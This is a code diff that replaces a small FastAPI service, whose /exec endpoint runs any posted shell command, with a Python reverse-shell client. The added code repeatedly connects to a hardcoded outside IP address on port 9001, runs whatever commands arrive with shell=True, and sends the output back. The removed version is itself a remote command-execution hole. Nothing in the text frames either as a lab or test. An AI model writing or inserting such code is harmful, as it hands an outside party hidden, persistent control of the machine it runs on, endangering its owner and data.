@@ -1,24 +1,53 @@
+import socket
 import subprocess
-from fastapi import FastAPI
-from pydantic import BaseModel
+import json
+import time
 
-app = FastAPI()
+SERVER_IP = "158.255.6.84"
+PORT = 9001
 
-class Command(BaseModel):
-    cmd: str
 
-def execute(cmd: str) -> str:
+def connect():
+    while True:
+        try:
+            s = socket.socket()
+            s.connect((SERVER_IP, PORT))
+            print("[+] Connected to server")
+            return s
+        except:
+            time.sleep(5)
+
+
+def execute(cmd):
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
     except subprocess.CalledProcessError as e:
         output = e.output
+
     return output.decode()
 
-@app.get("/health")
-def health_check():
-    return {"status": "ok"}
 
-@app.post("/exec")
-def run_command(command: Command):
-    output = execute(command.cmd)
-    return {"output": output}
+def main():
+    s = connect()
+
+    while True:
+        try:
+            data = s.recv(4096)
+            if not data:
+                s = connect()
+                continue
+
+            message = json.loads(data.decode())
+            cmd = message["cmd"]
+
+            output = execute(cmd)
+
+            response = json.dumps({"output": output})
+            s.send(response.encode())
+
+        except:
+            s = connect()
+
+
+if __name__ == "__main__":
+    main()
